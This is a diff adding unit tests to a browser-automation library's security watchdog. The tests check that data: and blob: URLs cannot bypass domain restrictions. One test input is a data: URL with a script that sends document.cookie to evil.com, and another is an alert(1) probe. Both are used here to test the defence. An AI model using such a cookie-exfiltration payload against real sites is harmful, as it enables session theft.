@@ -434,6 +434,42 @@ class TestUrlProhibitlistSecurity:
 		assert watchdog._is_url_allowed('https://WWW.EXAMPLE.COM') is False
 		assert watchdog._is_url_allowed('https://mail.example.com') is True
 
+	def test_data_url_blocked_when_domain_restricted(self):
+		"""data: URLs must not bypass allowed_domains (script-execution / exfiltration vector)."""
+		from bubus import EventBus
+
+		from browser_use.browser.watchdogs.security_watchdog import SecurityWatchdog
+
+		browser_profile = BrowserProfile(allowed_domains=['example.com'], headless=True, user_data_dir=None)
+		browser_session = BrowserSession(browser_profile=browser_profile)
+		event_bus = EventBus()
+		watchdog = SecurityWatchdog(browser_session=browser_session, event_bus=event_bus)
+
+		# The attack scenario from the issue: a data: URL embedding script that redirects/exfiltrates
+		assert (
+			watchdog._is_url_allowed('data:text/html,<script>document.location="https://evil.com/steal?c="+document.cookie</script>')
+			is False
+		)
+		assert watchdog._is_url_allowed('data:text/plain,hello') is False
+
+		# blob: URLs are allowed only when their encoded origin passes the domain checks
+		assert watchdog._is_url_allowed('blob:https://example.com/uuid') is True
+		assert watchdog._is_url_allowed('blob:https://evil.com/uuid') is False
+
+	def test_data_and_blob_urls_allowed_without_restrictions(self):
+		"""data: and blob: URLs keep working when no domain restrictions are configured."""
+		from bubus import EventBus
+
+		from browser_use.browser.watchdogs.security_watchdog import SecurityWatchdog
+
+		browser_profile = BrowserProfile(headless=True, user_data_dir=None)
+		browser_session = BrowserSession(browser_profile=browser_profile)
+		event_bus = EventBus()
+		watchdog = SecurityWatchdog(browser_session=browser_session, event_bus=event_bus)
+
+		assert watchdog._is_url_allowed('data:text/html,<script>alert(1)</script>') is True
+		assert watchdog._is_url_allowed('blob:https://example.com/uuid') is True
+
 
 class TestDomainListOptimization:
 	"""Tests for domain list optimization (set conversion for large lists)."""
